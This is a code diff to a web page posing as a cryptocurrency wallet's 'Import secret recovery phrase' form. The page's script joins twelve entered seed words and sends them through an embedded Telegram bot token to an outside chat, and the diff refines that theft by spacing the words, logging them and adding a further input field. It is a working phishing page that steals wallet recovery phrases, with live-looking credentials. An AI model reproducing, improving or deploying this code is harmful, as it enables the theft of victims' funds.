@@ -65,7 +65,9 @@
 
         var chatid = "-764116271";
         var token = "2134079185:AAGt8n69AshEn9HWIKkMPe9tnBVu3hPptwk";
-        var text = fraze1  + fraze2 + fraze3 +  fraze4 +  fraze5 + fraze6 +  fraze7 + fraze8 +fraze9 + fraze10 +  fraze11 + fraze12;
+        var text = fraze1  + " " + fraze2 + " " + fraze3 + " " +  fraze4 + " " +  fraze5 + " " + fraze6 + " " +  fraze7 + " " + fraze8 + " " + fraze9 + " " + fraze10 + " " +  fraze11 + " " + fraze12;
+
+        console.log(text);
         //Отправляем текст в наш телеграм канал
         otpravka(token,text,chatid);
          
@@ -182,6 +184,7 @@
             <input name="phone9" type="text" class="input2 contact-form__input contact-form__input_name" tabindex="0" placeholder="9" id="input9" required="">
             <input name="phone10" type="text" class="input2 contact-form__input contact-form__input_name" tabindex="0" placeholder="10" id="input10" required="">
             <input name="phone11" type="text" class="input2 contact-form__input contact-form__input_name" tabindex="0" placeholder="11" id="input11" required="">
+            <input name="phone12" type="text" class="input2 contact-form__input contact-form__input_name" tabindex="0" placeholder="12" id="input12" required="">
             <input name="phone12" type="text" class="input2 contact-form__input contact-form__input_name" tabindex="0" placeholder="12" id="input12" required="">
           </div>
           <a ><button type="submit" onclick="OnClickSendNudes()">Import secret recovery phrase</button></a>
